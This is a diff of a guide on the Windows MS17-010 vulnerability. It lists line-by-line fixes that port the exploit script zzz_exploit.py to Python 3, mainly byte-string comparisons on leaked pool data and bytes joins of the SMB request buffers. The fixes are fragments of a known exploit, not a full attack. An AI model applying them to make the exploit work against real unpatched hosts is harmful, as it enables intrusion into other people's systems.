@@ -8,7 +8,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
 
 ### The suggested changes for `zzz_exploit.py`:
 
-- Substitute `str` by `bytes`:
+- Use `bytes` instead of `str` on the if statement:
     ```python
     Original:
     321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
@@ -17,7 +17,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     321        if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
     ```
 
-- Substitute:
+- Don't need to use `ord()` to convert `leakData` to Unicode:
     ```python
     Original:
     324        info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
@@ -26,7 +26,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     324        info['FRAG_POOL_SIZE'] = leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ] * X86_INFO['POOL_ALIGN']
     ```
 
-- Substitute  `str` by `bytes`:
+- Use `bytes` instead of `str` on the if statement:
     ```python
     Original:
     325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
@@ -35,7 +35,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     325        elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == b'Frag':
     ```
 
-- Substitute:
+- Don't need to use `ord()` to convert `leakData` to Unicode:
     ```python
     Original:
     328        info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
@@ -44,7 +44,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     328        info['FRAG_POOL_SIZE'] = leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ] * X64_INFO['POOL_ALIGN']
     ```
 
-- Substitute:
+- Use `bytes` instead of `str` to join the `reqs` elements:
     ```python
     Original:
     399        conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
@@ -53,7 +53,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     399        conn.send_raw(req1[-8:] + req2 + req3 + b''.join(reqs))
     ```
 
-- Substitute:
+- Use `bytes` instead of `str` on the if statement:
     ```python
     Original:
     418        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
@@ -62,7 +62,7 @@ MS17-010 is a security vulnerability in Microsoft Windows operating systems that
     418        if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != b'Frag':
     ```
 
-- Substitute:
+- Use `bytes` instead of `str` on the if statement:
     ```python
     Original:
     429        if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
